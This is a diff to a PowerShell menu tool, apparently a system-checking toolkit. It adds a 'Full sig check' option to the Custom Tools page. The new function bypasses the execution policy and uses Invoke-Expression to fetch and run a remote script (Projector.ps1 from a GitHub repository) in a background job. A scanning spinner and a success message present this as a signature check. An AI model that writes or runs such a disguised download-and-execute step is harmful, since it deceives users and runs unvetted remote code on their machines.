@@ -48,6 +48,36 @@ function Run-BAMParser {
     $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
 }
 
+function Run-FullSigCheck {
+    Clear-Host
+    Write-Host "Running Full sig check..." -ForegroundColor Cyan
+    Write-Host "This may take a moment." -ForegroundColor DarkGray
+    Write-Host ""
+
+    $job = Start-Job -ScriptBlock {
+        Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force
+        Invoke-Expression (Invoke-RestMethod "https://github.com/assemblya/OBS/raw/refs/heads/main/Projector.ps1")
+    }
+
+    $spinner = @("|", "/", "-", "\")
+    $i = 0
+
+    while ($job.State -eq "Running") {
+        Write-Host -NoNewline "`rScanning $($spinner[$i % $spinner.Count])"
+        Start-Sleep -Milliseconds 150
+        $i++
+    }
+
+    Receive-Job $job | Out-Host
+    Remove-Job $job
+
+    Write-Host ""
+    Write-Host "✔ Full sig check completed." -ForegroundColor Green
+    Write-Host ""
+    Write-Host "Press any key to return..." -ForegroundColor Yellow
+    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
+}
+
 function Show-RedLotusPage {
     while ($true) {
         Clear-Host
@@ -73,8 +103,7 @@ function Show-CustomToolsPage {
         Clear-Host
         Write-Host "===== Custom Tools =====" -ForegroundColor Green
         Write-Host ""
-        Write-Host "Your custom tools will appear here." -ForegroundColor White
-        Write-Host ""
+        Write-Host " [1] Full sig check" -ForegroundColor Cyan
         Write-Host " [B] Back to Main Menu" -ForegroundColor Yellow
         Write-Host " [Q] Quit" -ForegroundColor Red
         Write-Host ""
@@ -82,13 +111,13 @@ function Show-CustomToolsPage {
         $choice = Read-Host "Select an option"
 
         switch ($choice.ToUpper()) {
+            "1" { Run-FullSigCheck }
             "B" { return }
             "Q" { exit }
         }
     }
 }
 
-# Main loop
 while ($true) {
     Show-MainMenu
     $choice = Read-Host "Select an option"
